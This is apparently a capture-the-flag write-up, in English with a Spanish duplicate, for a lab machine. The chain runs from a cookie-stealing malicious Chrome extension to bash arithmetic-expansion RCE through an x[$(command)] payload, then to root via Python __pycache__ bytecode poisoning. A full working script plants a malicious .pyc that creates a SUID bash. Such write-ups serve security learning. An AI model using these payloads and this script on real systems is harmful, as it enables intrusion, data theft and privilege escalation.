Exploitation Summary

Exploitation process: The target machine was running an nginx web server hosting a page that accepted Chrome extension uploads in .zip format. The idea was that a bot would install and run the uploaded extension, which opened the door to a creative attack chain. I crafted a malicious Chrome extension with broad permissions (<all_urls>, cookies, tabs) that exfiltrated cookies and page content from all websites the bot visited, sending the data back to my attacker machine.

Through the exfiltrated cookies and HTML content, I discovered a hidden internal subdomain browsedinternals.htb running a Gitea instance (version 1.24.5). Inside Gitea, I found a repository containing a Flask application (app.py) and a bash script (routines.sh) running locally on port 5000. The bash script contained a dangerous [[ "$1" -eq 0 ]] comparison, which is vulnerable to arithmetic expansion RCE. By crafting a second malicious extension that made the bot's browser request a specially crafted URL on 127.0.0.1:5000 containing a URL-encoded payload like x[$(command)], I achieved remote code execution as the larry user and obtained a reverse shell.

For privilege escalation, the user larry could run /opt/extensiontool/extension_tool.py as root via sudo without a password. This Python script imported extension_utils, and the __pycache__ directory had world-writable permissions (similar to /tmp). I exploited this by crafting a malicious .pyc bytecode file with matching file size and timestamp to the original extension_utils.py, placing it in the __pycache__ directory. When the sudo command was executed, Python loaded the poisoned cache file, which created a SUID copy of /bin/bash, granting root access.

Technologies/Exploits: Chrome extension data exfiltration, bash arithmetic expansion RCE, Python __pycache__ bytecode cache poisoning via world-writable directory permissions.

Code Analysis - Arithmetic Expansion RCE

Reviewing the repository code, I find a critical vulnerability. In routines.sh, there are comparisons like this:

if [[ "$1" -eq 0 ]]; then

This type of comparison using -eq inside [[ ]] is dangerous because it's vulnerable to code execution through arithmetic expansion. If I can control the first argument and send it as x[$(id)], the variable expansion will execute the id command.

In app.py, I find the route that calls this script:

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

I can control the first argument via the <rid> parameter in the URL. Even though subprocess.run is used without shell=True, the bash script itself will perform the arithmetic expansion when evaluating the -eq comparison.

User larry may run the following commands on browsed:

The user can run /opt/extensiontool/extension_tool.py as root without a password. After reviewing the code of extension_tool.py and its dependency extension_utils.py, I don't find anything directly exploitable in the code itself.

However, something catches my eye: the __pycache__ directory has world-writable permissions (similar to /tmp), meaning anyone can create or modify files inside it. When the script is run with sudo, it creates this compiled bytecode file inside the cache directory:

extension_utils.cpython-312.pyc

Understanding __pycache__ Poisoning

When Python imports a module, it compiles it to bytecode (.pyc files) stored in __pycache__/. If this directory is world-writable, you can replace these compiled files with malicious bytecode that executes when the module is imported.

However, it's not as simple as just dropping a file — Python stores certain metadata about the cached file that must match for the cache to be used. Specifically, the malicious .pyc file must have exactly the same file size and the same timestamp as the original .py source file.

Crafting the Exploit

Taking all of this into account, I create a Python script that copies the original extension_utils.py but injects a command to create a SUID copy of /bin/bash. To maintain the exact same file size, it shortens a docstring comment to compensate for the added payload. It also matches the timestamp of the original file, then compiles it and places the resulting .pyc in the vulnerable __pycache__ directory:

import os
import py_compile

ORIGINAL_PY = '/opt/extensiontool/extension_utils.py'
TEMP_PY = '/tmp/extension_utils.py'
TARGET_PYC = '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'

orig_stat = os.stat(ORIGINAL_PY)
orig_size = orig_stat.st_size
orig_mtime = orig_stat.st_mtime

with open(ORIGINAL_PY, 'r') as f:
    original = f.read()

# Replace the long docstring with a shorter one
modified = original.replace(
    '""" Clean up temporary files or unnecessary directories after packaging """',
    '""" Clean """'
)

# Add our payload after imports
payload = "os.system('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')\n"
lines = modified.split('\n')
for i, line in enumerate(lines):
    if line.strip().startswith('from jsonschema'):
        lines.insert(i + 1, payload.rstrip())
        break
modified = '\n'.join(lines)

# Adjust to exact size
current = len(modified.encode('utf-8'))
if current > orig_size:
    modified = modified[:-(current - orig_size)]
elif current < orig_size:
    modified += ' ' * (orig_size - current)

with open(TEMP_PY, 'w') as f:
    f.write(modified)

os.utime(TEMP_PY, (orig_mtime, orig_mtime))

# Verify
if os.stat(TEMP_PY).st_size == orig_size:
    print(f"[+] Size matched: {orig_size} bytes")
    py_compile.compile(TEMP_PY, cfile=TARGET_PYC, doraise=True)
    print("[+] Exploit ready!")
else:
    print(f"[!] Size mismatch: {os.stat(TEMP_PY).st_size} vs {orig_size}")

Resumen de Explotación

Proceso de explotación: La máquina objetivo ejecutaba un servidor web nginx que alojaba una página que aceptaba subidas de extensiones de Chrome en formato .zip. La idea era que un bot instalaba y ejecutaba la extensión subida, lo que abría la puerta a una cadena de ataque creativa. Creé una extensión de Chrome maliciosa con permisos amplios (<all_urls>, cookies, tabs) que exfiltraba cookies y contenido de páginas de todos los sitios web que el bot visitaba, enviando los datos de vuelta a mi máquina atacante.

A través de las cookies y el contenido HTML exfiltrado, descubrí un subdominio interno oculto browsedinternals.htb ejecutando una instancia de Gitea (versión 1.24.5). Dentro de Gitea encontré un repositorio con una aplicación Flask (app.py) y un script bash (routines.sh) que corría localmente en el puerto 5000. El script bash contenía una comparación peligrosa con [[ "$1" -eq 0 ]], vulnerable a RCE mediante expansión aritmética. Creando una segunda extensión maliciosa que hacía que el navegador del bot solicitase una URL especialmente construida en 127.0.0.1:5000 con un payload codificado en URL como x[$(comando)], conseguí ejecución remota de código como el usuario larry y obtuve una reverse shell.

Para la escalada de privilegios, el usuario larry podía ejecutar /opt/extensiontool/extension_tool.py como root mediante sudo sin contraseña. Este script Python importaba extension_utils, y el directorio __pycache__ tenía permisos de escritura global (similar a /tmp). Exploté esto creando un archivo .pyc de bytecode malicioso con el mismo tamaño de archivo y timestamp que el extension_utils.py original, colocándolo en el directorio __pycache__. Al ejecutar el comando sudo, Python cargaba el archivo de caché envenenado, que creaba una copia SUID de /bin/bash, otorgándome acceso root.

Tecnologías/Exploits: Exfiltración de datos mediante extensión de Chrome, RCE por expansión aritmética en bash, envenenamiento de caché de bytecode Python __pycache__ mediante directorio con permisos de escritura global.

Análisis del Código - RCE por Expansión Aritmética

Revisando el código del repositorio, encuentro una vulnerabilidad crítica. En routines.sh hay comparaciones como esta:

if [[ "$1" -eq 0 ]]; then

Este tipo de comparaciones con -eq dentro de [[ ]] son peligrosas porque son vulnerables a ejecución de código mediante expansión aritmética. Si puedo controlar el primer argumento y enviarlo como x[$(id)], al expandirse la variable se ejecutará el comando id.

En app.py encuentro la ruta que llama a este script:

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

Por lo tanto, puedo controlar el primer argumento mediante el parámetro <rid> de la URL. Aunque subprocess.run se usa sin shell=True, el propio script bash realizará la expansión aritmética al evaluar la comparación con -eq.

Lo que me llama la atención es un directorio __pycache__ con permisos globales a lo /tmp, es decir, cualquiera puede crear cualquier cosa dentro. Al ejecutar el script Python con sudo, se crea este archivo dentro de pycache:

extension_utils.cpython-312.pyc

Entendiendo el Envenenamiento de __pycache__

Cuando Python importa un módulo, lo compila a bytecode (archivos .pyc) almacenados en __pycache__/. Si este directorio tiene permisos de escritura global, es posible reemplazar estos archivos compilados con bytecode malicioso que se ejecuta cuando se importa el módulo.

Sin embargo, no es tan fácil como crear un archivo y listo — Python guarda cierta información del archivo cacheado que hay que tener en cuenta. Concretamente, el archivo .pyc malicioso debe tener exactamente el mismo tamaño de archivo y el mismo timestamp que el fichero .py fuente original.

Creación del Exploit

Teniendo todo esto en cuenta, creo un script Python que copia el archivo original extension_utils.py pero inyecta un comando que crea una copia SUID de /bin/bash. Para mantener exactamente el mismo tamaño de archivo, acorta un comentario de tipo docstring para compensar por el tamaño extra del payload. También modifica el timestamp del archivo para que coincida con el del original, luego lo compila y coloca el .pyc resultante en el directorio __pycache__ vulnerable:

import os
import py_compile

ORIGINAL_PY = '/opt/extensiontool/extension_utils.py'
TEMP_PY = '/tmp/extension_utils.py'
TARGET_PYC = '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'

orig_stat = os.stat(ORIGINAL_PY)
orig_size = orig_stat.st_size
orig_mtime = orig_stat.st_mtime

with open(ORIGINAL_PY, 'r') as f:
    original = f.read()

# Replace the long docstring with a shorter one
modified = original.replace(
    '""" Clean up temporary files or unnecessary directories after packaging """',
    '""" Clean """'
)

# Add our payload after imports
payload = "os.system('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')\n"
lines = modified.split('\n')
for i, line in enumerate(lines):
    if line.strip().startswith('from jsonschema'):
        lines.insert(i + 1, payload.rstrip())
        break
modified = '\n'.join(lines)

# Adjust to exact size
current = len(modified.encode('utf-8'))
if current > orig_size:
    modified = modified[:-(current - orig_size)]
elif current < orig_size:
    modified += ' ' * (orig_size - current)

with open(TEMP_PY, 'w') as f:
    f.write(modified)

os.utime(TEMP_PY, (orig_mtime, orig_mtime))

# Verify
if os.stat(TEMP_PY).st_size == orig_size:
    print(f"[+] Size matched: {orig_size} bytes")
    py_compile.compile(TEMP_PY, cfile=TARGET_PYC, doraise=True)
    print("[+] Exploit ready!")
else:
    print(f"[!] Size mismatch: {os.stat(TEMP_PY).st_size} vs {orig_size}")
